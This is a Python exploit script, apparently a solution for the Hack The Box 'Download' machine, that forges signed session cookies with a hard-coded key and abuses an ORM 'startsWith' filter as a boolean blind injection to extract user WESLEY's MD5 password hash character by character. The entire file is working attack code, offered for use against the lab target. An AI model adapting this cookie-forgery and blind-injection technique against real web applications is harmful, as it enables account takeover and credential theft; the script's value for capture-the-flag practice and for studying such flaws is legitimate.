#!/usr/bin/env python3

import re
import time
import os
import requests
import subprocess

charset  = "0123456789abcdef" # md5(password), so only hex characters
url      = "http://download.htb/home/"
passwd   = ""
tmp_file = "/home/tropkal/htb/download/tmp" # path to the tmp_file thats used in this program

def build_json(char):
  payload = '{"flash":{"info":[],"error":[],"success":[]},"user":{"username":"WESLEY","password":{"startsWith":"'
  payload = payload + passwd + str(char) + '"' + '}}}'
  return payload

def make_req(forged_cookie):
  proxies = {"http":"http://10.10.14.48:8080"}
  #r = requests.get(url, cookies=cookies, proxies=proxies)
  r = requests.get(url, cookies=cookies)
  return r.text

def cleanup():
  os.system(f"/usr/bin/rm {tmp_file}")

for i in range(32): # md5(passwd) so 32chars long, found in routers/auth.js
  for char in charset:
    # create a temp file and echo each json payload into it bcuz cookie-monster doesnt take a list of json objects to encode
    # or im blind and cand read the help menu so we're doing it 1 at a time lul
    os.system(f"/usr/bin/echo '{build_json(char)}' > {tmp_file}")
    # call cookie-monster to build the cookie
    result = subprocess.check_output([f'cookie-monster','-k','8929874489719802418902487651347865819634518936754','-e','-f',f'{tmp_file}','-n','download_session'])
    # sleep to give cookie-monster time to properly run and return its output
    time.sleep(0.5)
    # use regex to extract the cookies
    download_session = re.search(r"download_session.*",result.decode())
    download_session_sig = re.search(r"download_session\.sig.*",result.decode())
    download_session = download_session.group(0)
    download_session_sig = download_session_sig.group(0)
    c1 = re.search(r"download_session=(.*)",download_session)
    c2 = re.search(r"download_session\.sig=(.*)",download_session_sig)
    c1 = c1.group(1)[:-5] # 5 weird bytes at the end of the extracted strings
    c2 = c2.group(1)[:-5] # so we gotta clean that up
    # build the cookies object
    cookies = {"download_session":str(c1),"download_session.sig":c2}
    # make the request
    resp_text = make_req(cookies)
    # check if it returned files (bcuz of boolean sqli) and if it did then print the current char
    if "No files found" not in resp_text:
      print("Exfiltrated passwd: " + passwd + str(char))
      passwd += char
      break

# cleanup the temp file used here and exit
cleanup()
exit()
